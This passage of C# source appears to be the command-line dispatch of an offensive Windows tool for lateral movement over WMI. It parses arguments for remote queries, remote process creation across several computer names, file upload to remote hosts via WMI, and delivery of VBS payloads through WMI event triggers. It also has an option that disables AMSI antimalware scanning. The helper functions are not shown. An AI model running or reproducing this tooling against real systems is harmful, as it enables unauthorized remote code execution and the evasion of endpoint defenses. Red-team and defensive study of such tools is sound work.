            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";
            bool result = false;
            bool disableAmsi = false;

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }

            if (arguments.ContainsKey("result"))
            {
                result = arguments["result"].ToLower() == "true";
            }

            if (arguments.ContainsKey("amsi"))
            {
                disableAmsi = arguments["amsi"].ToLower() == "disable";
            }

            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }

            if (!arguments.ContainsKey("action"))
            {
                Usage();
                return;
            }

            if (arguments["action"] == "query")
            {
                if (!arguments.ContainsKey("query"))
                {
                    Usage();
                    return;
                }

                if (arguments.ContainsKey("computername"))
                {
                    // remote query
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        if (arguments.ContainsKey("namespace"))
                        {
                            RemoteWMIQuery(computerName, arguments["query"], arguments["namespace"], username, password);
                        }
                        else
                        {
                            RemoteWMIQuery(computerName, arguments["query"], "", username, password);
                        }
                    }
                }
                else
                {
                    // local query
                    if (arguments.ContainsKey("namespace"))
                    {
                        LocalWMIQuery(arguments["query"], arguments["namespace"]);
                    }
                    else
                    {
                        LocalWMIQuery(arguments["query"]);
                    }
                }
            }
            else if (arguments["action"] == "create" || arguments["action"] == "execute" || arguments["action"] == "exec")
            {
                // remote process call creation
                if ((arguments.ContainsKey("computername")) && (arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
                    }
                }
                else if (arguments.ContainsKey("command"))
                {
                    // local process call creation
                    string[] computerNames = { "localhost" };
                    foreach (string computerName in computerNames)
                    {
                        RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "upload")
            {
                if (arguments.ContainsKey("computername") && arguments.ContainsKey("source") && arguments.ContainsKey("dest"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    byte[] fileData = GetFileContents(arguments["source"]);

                    foreach (string computerName in computerNames)
                    {
                        UploadFileViaWMI(computerName, username, password, fileData, arguments["dest"], disableAmsi);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "executevbs")
            {
                // remote VBS execution
                if (arguments.ContainsKey("computername"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    string payload = GetVBSPayload(arguments);

                    // in seconds
                    int triggerTimerAfter = 10;
                    int scriptKillTimeout = 12;

                    if (arguments.ContainsKey("trigger"))
                    {
                        triggerTimerAfter = Int32.Parse(arguments["trigger"]);
                    }

                    if (arguments.ContainsKey("timeout"))
                    {
                        scriptKillTimeout = Int32.Parse(arguments["timeout"]);
                    }

                    Console.WriteLine(String.Format(@"[*] Script will trigger after {0} and we'll wait for {1} seconds.",
                        triggerTimerAfter, scriptKillTimeout));

                    foreach (string computerName in computerNames)
                    {
                        string eventName = "Debug";
                        if (arguments.ContainsKey("eventname"))
                        {
                            eventName = arguments["eventname"];
                        }

                        RemoteWMIExecuteVBS(computerName, eventName, username, password, payload, disableAmsi, triggerTimerAfter, scriptKillTimeout);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else
            {
                Usage();
                return;
            }
        }
    }
}
